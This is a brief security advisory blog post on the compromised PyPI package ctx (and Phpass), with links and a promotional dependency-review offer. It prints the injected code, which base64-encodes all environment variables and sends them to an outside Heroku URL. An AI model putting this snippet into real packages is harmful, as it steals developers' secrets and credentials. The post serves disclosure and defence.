---
title: ""
description: 
slug: 
image: 
date: 2022-05-24
keywords: []
tags: []
authors: []
---

<!--
  ~ Copyright by LunaSec (owned by Refinery Labs, Inc)
  ~
  ~ Licensed under the Creative Commons Attribution-ShareAlike 4.0 International
  ~ (the "License"); you may not use this file except in compliance with the
  ~ License. You may obtain a copy of the License at
  ~
  ~ https://creativecommons.org/licenses/by-sa/4.0/legalcode
  ~
  ~ See the License for the specific language governing permissions and
  ~ limitations under the License.
  ~
-->

## PyPi package, ctx, compromised

After 7 years, the pypi package ctx received a version update. The version was changed from `0.1.2` to `0.2.2` and in this 
update, malicious code was observed being added. 

<!--truncate-->

Malicous code that was addex to the `ctx` package.

```python
def __init__(self):
    self.sendRequest()

    # code that performs dict access
    # please DO NOT RUN THIS CODE !

     def sendRequest(self):
        string = ""
        for _, value in environ.items():
            string += value+" "

        message_bytes = string.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')

        response = requests.get("https://anti-theft-web.herokuapp.com/hacked/"+base64_message)
```

## Phpass contains similar malware

The library Phpass also received identical malicous code.

https://twitter.com/s0md3v/status/1529010306466615296?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1529027612332335104%7Ctwgr%5E%7Ctwcon%5Es2_&ref_url=https%3A%2F%2Fblog.sonatype.com%2Fpypi-package-ctx-compromised-are-you-at-risk


Archived version page of package versions: https://archive.ph/xTUEN

Initial post observing the package had been updated: https://old.reddit.com/r/Python/comments/uumqmm/ctx_new_version_released_after_7_years_750k
Reddit post with details about the malicious changes to ctx: https://old.reddit.com/r/Python/comments/uwhzkj/i_think_the_ctx_package_on_pypi_has_been_hacked/

Sonatype blog post with details about timeline: https://blog.sonatype.com/pypi-package-ctx-compromised-are-you-at-risk 

### Limited Offer: We'll manually review your dependencies
 
We need your feedback to help prioritize what
features to build next and doing some manual work is the fastest way for us to get it. For a limited number of companies,
we are offering to manually review dependencies, eliminate the false positives, and send a report on what needs to be addressed and why.

Having some _very_ experienced security engineers take a look is great peace of mind. Please send an email to [deps@lunatrace.io](mailto:deps@lunasec.io) if you're interested.
